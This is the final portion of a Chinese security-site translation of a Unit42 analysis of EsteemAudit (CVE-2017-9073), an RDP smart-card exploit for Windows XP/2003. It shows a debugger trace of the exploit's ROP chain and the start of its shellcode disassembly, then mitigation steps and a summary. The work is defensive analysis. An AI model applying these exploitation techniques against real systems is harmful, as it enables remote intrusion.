08011e7a&nbsp;c21c00&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1Ch
0:011&gt;&nbsp;t
eax=02dfe3c4&nbsp;ebx=00000001&nbsp;ecx=77f50c75&nbsp;edx=00000000&nbsp;esi=77f3f618&nbsp;edi=08019078
eip=0801118e&nbsp;esp=08019100&nbsp;ebp=02dfe404&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;po&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000202
gpkcsp!MyCPImportKey+0xac3:
0801118e&nbsp;c21800&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;18h
0:011&gt;&nbsp;t
eax=02dfe3c4&nbsp;ebx=00000001&nbsp;ecx=77f50c75&nbsp;edx=00000000&nbsp;esi=77f3f618&nbsp;edi=08019078
eip=08011fef&nbsp;esp=0801911c&nbsp;ebp=02dfe404&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;po&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000202
gpkcsp!__report_gsfailure+0xdf:
08011fef&nbsp;c3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret
0:011&gt;&nbsp;t
eax=02dfe3c4&nbsp;ebx=00000001&nbsp;ecx=77f50c75&nbsp;edx=00000000&nbsp;esi=77f3f618&nbsp;edi=08019078
eip=080128cc&nbsp;esp=08019120&nbsp;ebp=02dfe404&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;po&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000202
gpkcsp!CC_Exit+0x4f:
080128cc&nbsp;58&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax
0:011&gt;&nbsp;t
eax=0000008f&nbsp;ebx=00000001&nbsp;ecx=77f50c75&nbsp;edx=00000000&nbsp;esi=77f3f618&nbsp;edi=08019078
eip=080128cd&nbsp;esp=08019124&nbsp;ebp=02dfe404&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;po&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000202
gpkcsp!CC_Exit+0x50:
080128cd&nbsp;5b&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ebx
0:011&gt;&nbsp;t
eax=0000008f&nbsp;ebx=7ffe0300&nbsp;ecx=77f50c75&nbsp;edx=00000000&nbsp;esi=77f3f618&nbsp;edi=08019078
eip=080128ce&nbsp;esp=08019128&nbsp;ebp=02dfe404&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;po&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000202
gpkcsp!CC_Exit+0x51:
080128ce&nbsp;c3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret
0:011&gt;&nbsp;t
eax=0000008f&nbsp;ebx=7ffe0300&nbsp;ecx=77f50c75&nbsp;edx=00000000&nbsp;esi=77f3f618&nbsp;edi=08019078
eip=08015074&nbsp;esp=0801912c&nbsp;ebp=02dfe404&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;po&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000202
gpkcsp!CC_Exit+0x27f7:
08015074&nbsp;ff23&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[ebx]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ds:0023:7ffe0300={ntdll!KiFastSystemCall&nbsp;(7c9585e8)}
Shellcode&nbsp;start:
No&nbsp;prior&nbsp;disassembly&nbsp;possible
08019148&nbsp;b004&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;al,4
0801914a&nbsp;648b00&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,dword&nbsp;ptr&nbsp;fs:[eax]
0801914d&nbsp;2d00060000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,600h
08019152&nbsp;89c4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;esp,eax
08019154&nbsp;89c6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;esi,eax
08019156&nbsp;e800000000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;gpkcsp!IsProgButtonClick+0x8f&nbsp;(0801915b)
0801915b&nbsp;90&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nop
0801915c&nbsp;5d&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ebp
0801915d&nbsp;8b85d5000000&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,dword&nbsp;ptr&nbsp;[ebp+0D5h]
08019163&nbsp;894604&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[esi+4],eax
08019166&nbsp;8b85d9000000&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,dword&nbsp;ptr&nbsp;[ebp+0D9h]
0801916c&nbsp;89460c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[esi+0Ch],eax
0801916f&nbsp;31c0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,eax
08019171&nbsp;894610&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[esi+10h],eax
08019174&nbsp;894614&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[esi+14h],eax
08019177&nbsp;8b85dd000000&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,dword&nbsp;ptr&nbsp;[ebp+0DDh]
0801917d&nbsp;8b00&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,dword&nbsp;ptr&nbsp;[eax]
0801917f&nbsp;8b80bc000000&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,dword&nbsp;ptr&nbsp;[eax+0BCh]
08019185&nbsp;894618&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[esi+18h],eax
08019188&nbsp;8b85e1000000&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,dword&nbsp;ptr&nbsp;[ebp+0E1h]
0801918e&nbsp;8b00&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,dword&nbsp;ptr&nbsp;[eax]
08019190&nbsp;89461c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[esi+1Ch],eax
08019193&nbsp;8b85e5000000&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,dword&nbsp;ptr&nbsp;[ebp+0E5h]
08019199&nbsp;8b00&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,dword&nbsp;ptr&nbsp;[eax]
0801919b&nbsp;894620&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[esi+20h],eax
0801919e&nbsp;8b460c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,dword&nbsp;ptr&nbsp;[esi+0Ch]
080191a1&nbsp;894628&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[esi+28h],eax
080191a4&nbsp;31c0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,eax
080191a6&nbsp;89462c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[esi+2Ch],eax
080191a9&nbsp;e8b5000000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;gpkcsp!IsProgButtonClick+0x197&nbsp;(08019263)
…
0:011&gt;&nbsp;!address&nbsp;08019148
Failed&nbsp;to&nbsp;map&nbsp;Heaps&nbsp;(error&nbsp;80004005)
Usage:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Image
Allocation&nbsp;Base:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;08000000
Base&nbsp;Address:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;08019000
End&nbsp;Address:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0801e000
Region&nbsp;Size:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;00005000
Type:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;01000000&nbsp;&nbsp;&nbsp;&nbsp;MEM_IMAGE
State:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;00001000&nbsp;&nbsp;&nbsp;&nbsp;MEM_COMMIT
Protect:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;00000040&nbsp;&nbsp;&nbsp;PAGE_EXECUTE_READWRITE
More&nbsp;info:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lmv&nbsp;m&nbsp;gpkcsp
More&nbsp;info:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;!lmi&nbsp;gpkcsp
More&nbsp;info:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ln&nbsp;0x8019148</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">检测和暂时缓解措施</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">CVE-2017-9073仅存在Windows XP和Windows 2003上，且这两个系统不再收到微软的支持。所以用户应该在第一时间升级到最新版的Windows系统。由于漏洞出现在RDP的智能卡模块，所以以下措施也可以暂时缓解漏洞：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">在组策略中关闭智能卡模块</span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在注册表中关闭智能卡模块。在路径HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services\下增加或者设置键值0，类型为REG_DWORD</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">关闭或者限制外接的RDP访问请求</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">总结</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">RDP是Windows上非常有用且非常复杂的模块。基于我们对EsteemAudit的分析，这个漏洞本身并不难发现。不过难点在如何进行成功的利用。有趣的是gpkcsp选择了一个全局变量来存储客户端发来的原始数据，这样可以使攻击者在没有ASLR的情况下在一个固定的已知地址部署完全可控的数据。利用工具的作者利用了这个特性完成了exploit。EsteemAudit是一个在Windows XP和Windows 2003上的利用工具。用户需要在类似于WanaCryp0t有蠕虫行为的病毒利用这个工具进行大规模传播前前，进行XP和2003系统的暂时缓解措施避免财产损失。</span></p></p>
                <hr/>
                <p style="text-align: center;">
                    <img src="http://bobao.360.cn/img/app.jpeg"/>
                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
                </p>
                                <p>本文由 安全客 翻译，转载请注明“转自安全客”，并附上链接。<br/><a class="text-more" href="http://researchcenter.paloaltonetworks.com/2017/05/unit42-dissection-esteemaudit-windows-remote-desktop-exploit/" target="_blank">原文链接：http://researchcenter.paloaltonetworks.com/2017/05/unit42-dissection-esteemaudit-windows-remote-desktop-exploit/</a></p>
                            </div>
            <div style="margin-top: 20px;background-color:#FFFFFF">
    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】NSA武器库：CVE-2017-9073 EsteemAudit分析 - 安全客 - 有思想的安全新媒体" />
    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
    <a name="mao"></a>
    <div class="reg-log mobile-hiden">
        <div class="" id="userTo">   
            <div id="to-list" class="input-text" style="">
                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
                <ul id="preadded" style="display:none">       
                </ul>
                <div id="to-auto" style="width: 200px">
                    <ul id="feed">
                    </ul>
                </div>
            </div>
        </div>
        <input type="hidden" id="source-id" value="3937" />
        <input type="hidden" id="source-type" value="learning" />
        <input type="hidden" id="post-comment-url" value="/comment/add" />
        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
            </div>
    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />

        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
    </div>


    <div class="clearfix"></div>
    <div class="comments">
        <div class="comments-head">
            <span class="title">用户评论</span>
        </div>
                <div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/7x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="14490" user-name="殇情之颠" href="javascript:;">
                殇情之颠            </a>
                        <span class="comment-time">2017-06-05 15:00:58</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="14490">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_14490" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">这段时间不要随便用windows系统浏览某些网站</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/6x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="14489" user-name="恒之" href="javascript:;">
                恒之            </a>
                        <span class="comment-time">2017-06-05 15:00:58</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="14489">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_14489" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">Repost</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>

        <a class="more-long comment-more" href="javascript:;" data-target="/comment/more" data-type="learning" data-source-id="3937" data-page="2">查看更多</a>
            </div>
</div>
<script>
    $(function () {
        $('.anonymous-comment').click(function () {
            $(".join").hide();
            $(".reg-log textarea").first().removeAttr("disabled").show();
            $('#use_nickname').val('1');
//            $('#trigger-nickname').attr('checked', true);
            $('#trigger-nickname').trigger('click');
        });
        //为所有复选框绑定事件
//        checkbox_on_click();
        //ajax随机获取昵称
//        randnicknameajax(0);
        //ajax检测登录状态
        comment_check_login();
    });



    function input_checkbox(flag) {
        $('input:checkbox').each(function () {
            var value = flag ? 1 : 0;
            $(this).prop('checked', flag);
            $(this).val(value);
        });
    }

//ajax随机获取昵称
    function randnicknameajax(flag) {
        $.ajax({
            type: 'POST',
            url: $('#post-nickname-url-ajax').val(),
            data: {limit: 1, flag: flag},
            dataType: "json",
            success: function (data) {
                $('#nick-name').val(data.data[0]);
                _nick_name=data.data[0];
            }
        });
    }
    $();
//ajax检测登录状态
    function comment_check_login() {
        $.ajax({
            type: 'POST',
            url: $('#post-check-login-url-ajax').val(),
            data: {},
            dataType: "json",
            success: function (data) {
                if (data.success) {
                    $('.join').hide();
                    $(".reg-log textarea").first().removeAttr("disabled").show();
                    $("#span_use_nickname").show();
                    $('#use_nickname').val('0');
                    $('#use_nickname').attr('checked', false);
                }
            }
        });
    }
</script>        </div>
    </div>
    <div class="side-bar">
        <div class="mod hot-news">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
    </div>
    <ul class="links-list">
                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
            </ul>
</div>        <!-- 友情链接 -->
        <div class="mod blog-links mobile-hide">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
        <a href="/links/index.html" class="more">更多<i></i></a>
    </div>
        <ul class="links-list">
                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
            </ul>
    </div>
        <!-- 联系我们 -->
        <div class="mod contact mobile-hide" style="text-align:center">
    <div class="head-bar clearfix">
        <h2><i></i><span>关注我们</span></h2>
    </div>
    <!-- 微信关注 -->
    <ul class="contact-way">
        <li><a>微信关注</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
    <!-- APP下载 -->
    <ul class="contact-way">
        <li><a>安全播报APP</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
</div>

    </div>
</div>

<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/common.js?v=4.5"></script>
<script>$(function() {sync_count('comment');});</script>


<!-- 语法高亮 -->
<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
    </div>

        <div class="footer">
        <div class="friend-link">
            <a href="http://www.360.cn/" target="_blank">360首页</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">关于我们</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">联系我们</a>
            <span>|</span>
            <a href="/links/index.html" target="_blank">友情链接</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">招贤纳士</a>
        </div>
        <div class="copy">
            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
        </div>
    </div>
    
</div>

<!--奇舞团统计-->

<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
<script>
    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
</script>

<div class="hide">
    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
</div>
<div class="backToTop_wrap off">
    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
</div>
<script>
    var $backToTop_wrap = $(".backToTop_wrap"),
        $backToTop_btn = $("#back_to_top");

    if ($(window).scrollTop() > 100) {
        $backToTop_wrap.removeClass("off");
    }
    else {
        $backToTop_wrap.addClass("off");
    }

    $(window).on("scroll", function () {
        if ($(this).scrollTop() > 100) {
            $backToTop_wrap.removeClass("off");
        }
        else {
            $backToTop_wrap.addClass("off");
        }
    });

    $backToTop_btn.on("click", function () {
        $("html, body").animate({scrollTop: 0}, 120);
    });

    $(function () {
        var navlist = $('.nav-list > li');

        navlist.each(function () {
            $(this).on('mouseenter', function () {
                $(this).addClass('selected');
            });

            $(this).on('mouseleave', function () {
                $(this).removeClass('selected');
            });
        });
    })
</script>



</body>
</html>
